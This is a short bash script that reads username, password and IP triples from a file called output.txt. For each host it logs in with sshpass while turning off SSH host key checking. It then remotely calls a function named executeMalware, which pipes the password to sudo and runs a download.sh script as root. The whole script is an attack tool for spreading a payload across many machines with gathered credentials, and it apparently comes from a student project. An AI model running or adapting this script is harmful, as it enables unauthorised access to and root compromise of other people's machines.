##!/bin/bash -x

Red=$'\e[1;31m'
Green=$'\e[1;32m'
Blue=$'\e[1;34m'
Yellow=$'\e[1;33m'
Reset=$'\e[0;m'


login () { #pass, user, ip
	sshpass -p "$1" ssh -o "StrictHostKeyChecking no" -t -t "$2"@"$3" -p 22  &
	sleep 1
	sshpass -p "$1" ssh -o "StrictHostKeyChecking no" "$2"@"$3" "$(declare -f executeMalware "$1"  "$2");executeMalware "$1" "$2""
	echo "$Green OK $Reset"

}


executeMalware () {
	echo $1 | sudo -S chmod +x /home/"$2"/fyp/download.sh
	echo $1 | sudo -S sh /home/"$2"/fyp/download.sh

	echo "$Green Executed $Reset"
	echo "$1"
}


while read -r line;
do
	IFS=" " read -ra ADDR <<<"$line"

	for i in "${ADDR[0]}";
	do
	USER="$i"
	done

	for i in "${ADDR[1]}";
	do
	PASS="$i"
	done

	for i in "${ADDR[2]}";
	do
	IP="$i"
	done

	login $PASS $USER $IP &


done < output.txt
exit
